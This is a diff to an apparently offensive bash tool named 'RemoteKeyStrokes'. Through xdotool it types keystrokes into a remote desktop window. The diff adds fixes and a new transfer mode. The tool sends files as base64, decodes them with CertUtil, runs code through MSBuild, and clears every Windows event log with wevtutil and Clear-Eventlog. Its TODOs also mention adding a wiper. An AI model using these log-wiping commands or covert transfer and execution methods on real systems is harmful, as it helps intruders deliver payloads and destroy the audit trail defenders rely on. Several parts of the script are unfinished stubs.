@@ -1,5 +1,17 @@
 #!/bin/bash
 
+function print_status {
+    local status=$1
+    local message=$2
+    # TODO: Add colors
+    # [*] for blue PROGRESS
+    # [+] for green DONE
+    # [!] for yellow WARN
+    # [-] for red ERROR
+    # white to reset colors
+    echo ""
+}
+
 function check_dependencies() {
     if ! which xdotool &>/dev/null
     then
@@ -12,18 +24,6 @@ function check_dependencies() {
         fi
         exit 1
     fi
-}
-
-function print_status {
-    local status=$1
-    local message=$2
-    # TODO: Add colors
-    # [*] for blue PROGRESS
-    # [+] for green DONE
-    # [!] for yellow WARN
-    # [-] for red ERROR
-    # white to reset colors
-    echo ""
 }
 
 # TODO: Fill in the implementation
@@ -59,6 +59,7 @@ function Execute {
             ;;
         runspace)
             MSBuild "$commands"
+            ;;
         *)
             echo "Invalid Execution Type!" >&2
             exit 1
@@ -106,6 +107,9 @@ function OutputRemoteFile {
         cmdb64)
             Base64 $local_file $remote_file $platform "cmd"
             ;;
+        pwshcertutilb64)
+            Base64 $local_file $remote_file $platform "pwshcertutilb64"
+            ;;
         nixb64)
             Base64 $local_file $remote_file $platform "console"
             ;;
@@ -123,7 +127,7 @@ function Base64 {
     local input=$1
     local output_file=$2
     local platform=$3
-    local terminal=$4
+    local mode=$4
 
     # Check if input is passed as file
     if [ -f "$input" ]
@@ -131,7 +135,7 @@ function Base64 {
         echo "[*] Transferring file..."
         if [[ "$platform" = "windows" ]]
         then
-            if [ "$terminal" = "powershell" ]
+            if [ "$mode" = "powershell" ]
             then
                 file=$(base64 -w 0 $input)
                 pwsh_base64=$(cat <<EOF
@@ -145,14 +149,17 @@ EOF
                     xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "$line"
                     xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
                 done <<< "$pwsh_base64"
-            elif [ "$terminal" = "cmd" ]
+            elif [ "$mode" = "cmd" ]
             then
                 file=$(base64 -w 64 $input)
                 # TODO: Implement certutil base64 file transfer
                 CopyCon $file $output_file $platform "base64"
-                echo "Not yet implemented"
+            elif [ "$mode" = "pwshcertutilb64" ]
+            then
+                # TODO: Implement certutil base64 file transfer through powershell
+                echo "Not Yet implemented"
             fi
-        elif [[ "$platform" = "linux" && "$terminal" = "console" ]]
+        elif [[ "$platform" = "linux" && "$mode" = "console" ]]
         then
             while read -r line
             do
@@ -170,7 +177,7 @@ EOF
     if [[ ! -f "$input" && -n "$input" ]]
     then
         echo "Not implemented"
-        multiline=(cat <<<EOF
+        multiline=$(cat <<<EOF
 "$input"
 EOF
 )
@@ -216,15 +223,6 @@ function CopyCon {
     elif [[ ! -f "$input" && -n "$input" && "$mode" = "base64" ]]
     then
         # TODO: Be sure to modify and test that it works
-        while IFS= read -r line
-        do
-            length=$(echo -n "$line" | wc -c)
-            if [ "$length" -ge 255 ]
-            then
-                echo "[-] Character Limit reached! Terminating program."
-                exit 1
-            fi
-        done <<< "$input"
 
         echo "[*] Transferring file..."
         # TODO: replace temp.txt to randomize function
@@ -242,8 +240,10 @@ function CopyCon {
 
         xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "-----END CERTIFICATE-----"
         xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Ctrl+Z Return
+
         xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "CertUtil.exe -decode temp.txt $output_file"
         xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+        
         xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "del temp.txt"
         xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
     fi
@@ -397,6 +397,7 @@ function WevUtil {
     then
         Execute "for /f "tokens=*" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"" "none"
     elif [ "$mode" = "script" ]
+    then
     # TODO: Include the wiper and then transfer it with Base64 certutil cmd terminal
         echo "not implemented"
     else
@@ -412,6 +413,7 @@ function WinEvent {
     then
         Execute "Clear-Eventlog -Log Application,Security,System -Confirm"
     elif [ "$mode" = "script" ]
+    then
     # TODO: Include the wiper and then transfer it with Base64 powershell terminal
         echo "not implemented"
     else
@@ -423,7 +425,11 @@ function WinEvent {
 function EventViewer {
     local mode=$1
 
-    if [[ $mode = "" || $mode = "manual" ]]
+    if [ "$mode" = "info" ]
+    then
+        # TODO: Include information of this technique
+        echo ""
+    elif [[ $mode = "" || $mode = "manual" ]]
     then
         DialogBox "eventvwr.msc"
     else
@@ -467,23 +473,23 @@ function usage() {
     cat << EOF
 Usage: $0 (RemoteKeyStrokes)
 Options:
-    -c, --command <command | cmdfile>       Specify a command or a file containing to execute
-    -i, --input <input_file>                Specify the local input file to transfer
-    -o, --output <output_file>              Specify the remote output file to transfer
+    -c, --command <command | cmdfile>   Specify a command or a file containing to execute
+    -i, --input <input_file>            Specify the local input file to transfer
+    -o, --output <output_file>          Specify the remote output file to transfer
 
-    -p, --platform <operating_system>       Specify the operating system (windows is set by
-                                            default if not specified)
+    -p, --platform <operating_system>   Specify the operating system (windows is set by
+                                        default if not specified)
 
-    -m, --method <method>                   Specify the file transfer or execution method
-                                            (For file transfer "pwshb64" is set by default if
-                                            not specified. For command execution method
-                                            "none" is set by default if not specified)
+    -m, --method <method>               Specify the file transfer or execution method
+                                        (For file transfer "pwshb64" is set by default if
+                                        not specified. For command execution method
+                                        "none" is set by default if not specified)
 
-    -w, --windowname <name>	                Specify the window name for graphical remote
-                                            program (freerdp is set by default if not
-                                            specified)
+    -w, --windowname <name>             Specify the window name for graphical remote
+                                        program (freerdp is set by default if not
+                                        specified)
 
-    -h, --help                              Display this help message
+    -h, --help                          Display this help message
 EOF
     exit 1
 }
